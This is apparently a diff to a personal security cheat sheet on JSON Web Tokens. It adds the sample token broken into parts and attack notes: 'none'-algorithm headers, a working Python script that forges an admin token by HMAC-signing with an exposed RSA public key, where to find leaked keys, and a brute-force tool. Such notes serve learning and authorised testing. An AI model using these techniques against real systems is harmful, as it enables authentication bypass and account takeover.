@@ -29,9 +29,9 @@ Encoded in base 64 Separated by .
 - Payload
 - Signature
 
-Ex : 
+Ex : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
 
-Header : 
+Header : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
 ```python
 base64enc[{
 "algo":"HS256",
@@ -40,7 +40,7 @@ base64enc[{
 ```
 - alg - which algorithm is used to create the signature Ex : HS256,RS256,PS256
 
-Payload :
+Payload : eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ
 ```python
 base64enc[{
 "firstname:"sss",
@@ -49,7 +49,7 @@ base64enc[{
 }] 
 ```
 
-Signature : 
+Signature : SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
 ```python
 HMACSHA256{
 base64enc(header).base64enc(payload).secret(key)
@@ -68,21 +68,71 @@ base64enc(header).base64enc(payload).secret(key)
 ### Bugs
 1 - None Algorith Attack
 Change algo to none 
+```python
+{
+  "alg": "None",
+  "typ": "JWT"
+}
+{
+  "alg": None,
+  "typ": "JWT"
+}
+```
 And try to perform action
 Change algo to none + Remove All Data from Signature field
-
+```python
+{
+  "alg": "None",
+  "typ": "JWT"
+}
+# Remove Entire Signature Part Or Leave It Blank
+```
 2 - Algo Change
 RSA256 - Uses public key to verify token if we have that public key exposed we might be able to do this
 Create own HS256 Signed JWT With Exposed public key
 now The Server will Think The public Key is secret key and logs you in
+```python
+### JWT Token Generater
+import hmac
+import hashlib
+import base64
 
+#Paste the file with the key 
+file=open('public.pem')
+
+key = file.read()
+
+#Paste your header and payload here
+header = '{"alg":"HS256"}'
+payload = '{"name":"admin"}'
+
+#Creating encoded header
+encodedHBytes = base64.urlsafe_b64encode(header.encode("utf-8"))
+encodedHeader = str(encodedHBytes, "utf-8").rstrip("=")
+
+#Creating encoded payload
+encodedPBytes = base64.urlsafe_b64encode(payload.encode("utf-8"))
+encodedPayload = str(encodedPBytes, "utf-8").rstrip("=")
+
+#Concatenating header and payload
+token = (encodedHeader + "." + encodedPayload)
+
+#Creating signature
+sig = base64.urlsafe_b64encode(hmac.new(bytes(key, "UTF-8"),token.encode('utf-8'),hashlib.sha256).digest()).decode('UTF-8').rstrip("=")
+
+print(token + "." + sig)
+```
 How we found .pem in real senario. We find in leaking through jwk.json
+```python
+https://{yourDomain}/.well-known/jwks.json
+```
 or waybackurl's jwk.json file or .pem url
 
 3 - Change Signature section complete 
 Or Leave it blank
 
 4 BruteForce HS256 
-jwtbrute tool , jwt cracker
+[jwtbrute](https://github.com/jmaxxz/jwtbrute)
+
 
 
